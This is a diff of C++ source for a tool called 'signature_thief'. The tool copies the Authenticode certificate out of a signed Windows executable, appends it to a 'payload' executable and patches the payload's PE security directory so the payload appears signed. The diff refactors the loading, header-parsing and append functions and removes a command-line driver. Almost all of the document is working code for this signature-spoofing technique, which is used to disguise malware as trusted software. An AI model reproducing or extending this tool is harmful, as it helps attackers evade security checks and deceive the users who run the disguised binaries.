@@ -1,117 +1,111 @@
 ﻿#include "signature_thief.hpp"
 
-#include <iostream>
 #include <fstream>
+#include <iostream>
 #include <stdexcept>
 
-signature_thief::signature_thief(std::filesystem::path path_to_file) : m_source_path(std::move(path_to_file)) {}
+// Constructor
+signature_thief::signature_thief(std::filesystem::path path)
+    : m_payload_path(std::move(path)) {
+}
 
-std::optional<std::string> signature_thief::load_file() noexcept {
-    std::ifstream file(m_source_path, std::ios::binary | std::ios::ate);
-    if (!file.is_open()) {
-        return "Error opening file: " + m_source_path.string();
-    }
+// Align to 8 bytes
+static void align_to_8(std::vector<uint8_t>& buffer)
+{
+    size_t aligned = (buffer.size() + 7) & ~size_t(7);
+    buffer.resize(aligned);
+}
 
-    auto size = file.tellg();
-    file.seekg(0, std::ios::beg);
-    m_file.resize(size);
-    file.read(reinterpret_cast<char*>(m_file.data()), size);
+// Load payload (the file to which certificate will be appended)
+std::optional<std::string> signature_thief::load_payload() noexcept
+{
+    std::ifstream in(m_payload_path, std::ios::binary | std::ios::ate);
+    if (!in.is_open())
+        return "Unable to open payload file: " + m_payload_path.string();
+
+    auto size = in.tellg();
+    if (size <= 0)
+        return "Invalid payload file size: " + m_payload_path.string();
+
+    m_payload.resize(size);
+    in.seekg(0);
+
+    if (!in.read(reinterpret_cast<char*>(m_payload.data()), size))
+        return "Failed to read payload file: " + m_payload_path.string();
 
     return std::nullopt;
 }
 
-IMAGE_DATA_DIRECTORY* signature_thief::get_security_dir(uint8_t* base) {
-    auto* dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(base);
-    auto* nt_headers32 = reinterpret_cast<PIMAGE_NT_HEADERS32>(base + dos_header->e_lfanew);
+// Returns pointer to IMAGE_DIRECTORY_ENTRY_SECURITY
+IMAGE_DATA_DIRECTORY* signature_thief::security_directory(uint8_t* base)
+{
+    auto* dos = reinterpret_cast<PIMAGE_DOS_HEADER>(base);
 
-    if (nt_headers32->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
-        return &nt_headers32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];
-    }
-    else {
-        auto* nt_headers64 = reinterpret_cast<PIMAGE_NT_HEADERS64>(base + dos_header->e_lfanew);
-        return &nt_headers64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];
-    }
+    if (dos->e_magic != IMAGE_DOS_SIGNATURE)
+        throw std::runtime_error("Invalid DOS header");
+
+    if (dos->e_lfanew > 0x100000)
+        throw std::runtime_error("Invalid PE header offset");
+
+    auto* nt = reinterpret_cast<PIMAGE_NT_HEADERS>(base + dos->e_lfanew);
+
+    if (nt->Signature != IMAGE_NT_SIGNATURE)
+        throw std::runtime_error("Invalid NT signature");
+
+    WORD magic = nt->OptionalHeader.Magic;
+
+    if (magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC)
+        return &reinterpret_cast<PIMAGE_NT_HEADERS32>(nt)
+        ->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];
+
+    if (magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC)
+        return &reinterpret_cast<PIMAGE_NT_HEADERS64>(nt)
+        ->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];
+
+    throw std::runtime_error("Unknown PE optional header format");
 }
 
-void signature_thief::extract_certificate(const std::filesystem::path& source_path) {
-    std::ifstream file(source_path, std::ios::binary | std::ios::ate);
-    if (!file.is_open()) {
-        throw std::runtime_error("Error opening file: " + source_path.string());
-    }
+// Extract certificate from signed PE
+void signature_thief::extract_certificate(const std::filesystem::path& signed_pe_path)
+{
+    std::ifstream in(signed_pe_path, std::ios::binary | std::ios::ate);
+    if (!in.is_open())
+        throw std::runtime_error("Unable to open signed file: " + signed_pe_path.string());
 
-    auto size = file.tellg();
-    file.seekg(0, std::ios::beg);
+    auto size = in.tellg();
+    if (size <= 0)
+        throw std::runtime_error("Invalid signed file size: " + signed_pe_path.string());
 
     std::vector<uint8_t> buffer(size);
-    file.read(reinterpret_cast<char*>(buffer.data()), size);
+    in.seekg(0);
 
-    auto* cert_info_ptr = get_security_dir(buffer.data());
+    if (!in.read(reinterpret_cast<char*>(buffer.data()), size))
+        throw std::runtime_error("Failed to read signed file: " + signed_pe_path.string());
 
-    auto& cert_info = *cert_info_ptr;
-    if (cert_info.VirtualAddress == 0 || cert_info.Size == 0 || cert_info.VirtualAddress + cert_info.Size > buffer.size()) {
-        throw std::runtime_error("No valid certificate found in file: " + source_path.string());
-    }
-    m_cert.assign(buffer.begin() + cert_info.VirtualAddress,
-    buffer.begin() + cert_info.VirtualAddress + cert_info.Size);
+    auto* sec_dir = security_directory(buffer.data());
+
+    DWORD va = sec_dir->VirtualAddress;
+    DWORD sz = sec_dir->Size;
+
+    if (va == 0 || sz == 0 || va + sz > buffer.size())
+        throw std::runtime_error("No valid certificate found in signed PE");
+
+    m_cert.assign(buffer.begin() + va, buffer.begin() + va + sz);
 }
 
-void signature_thief::append_certificate_to_payload(std::span<const uint8_t> signature_data) {
-    if (signature_data.empty()) {
-        throw std::runtime_error("No certificate extracted to append.");
-    }
-    update_pe_header();
-    m_file.insert(m_file.end(), signature_data.begin(), signature_data.end());
-}
+// Append certificate to payload
+void signature_thief::append_certificate(std::span<const uint8_t> signature)
+{
+    if (signature.empty())
+        throw std::runtime_error("Certificate is empty");
 
-void signature_thief::update_pe_header() {
-    auto* cert_info_ptr = get_security_dir(m_file.data());
+    align_to_8(m_payload);
 
-    cert_info_ptr->VirtualAddress = static_cast<DWORD>(m_file.size());
-    cert_info_ptr->Size = static_cast<DWORD>(m_cert.size());
-}
+    DWORD cert_offset = static_cast<DWORD>(m_payload.size());
 
-int main(int argc, char** argv) {
-    try {
-        std::string signed_pe_path, payload_path, output_path;
+    m_payload.insert(m_payload.end(), signature.begin(), signature.end());
 
-        if (argc >= 4) {
-            signed_pe_path = argv[1];
-            payload_path = argv[2];
-            output_path = argv[3];
-        }
-        else {
-            std::cout << "Enter the path to the signed file: ";
-            std::getline(std::cin, signed_pe_path);
-
-            std::cout << "Enter the path to the payload file: ";
-            std::getline(std::cin, payload_path);
-
-            std::cout << "Enter the output path: ";
-            std::getline(std::cin, output_path);
-        }
-
-        signature_thief thief(payload_path);
-        auto result = thief.load_file();
-        if (result) {
-            std::cerr << "Error: " << *result << "\n";
-            return EXIT_FAILURE;
-        }
-
-        thief.extract_certificate(signed_pe_path);
-        thief.append_certificate_to_payload(thief.get_certificate());
-
-        std::ofstream output_file(output_path, std::ios::binary);
-        if (!output_file.is_open()) {
-            throw std::runtime_error("Error opening output file: " + output_path);
-        }
-        output_file.write(reinterpret_cast<const char*>(thief.get_binary().data()), thief.get_binary().size());
-        output_file.close();
-
-        std::cout << "Signature appended successfully." << std::endl;
-        return EXIT_SUCCESS;
-    }
-    catch (const std::exception& e) {
-        std::cerr << "Error: " << e.what() << std::endl;
-        return EXIT_FAILURE;
-    }
+    auto* sec_dir = security_directory(m_payload.data());
+    sec_dir->VirtualAddress = cert_offset;
+    sec_dir->Size = static_cast<DWORD>(signature.size());
 }
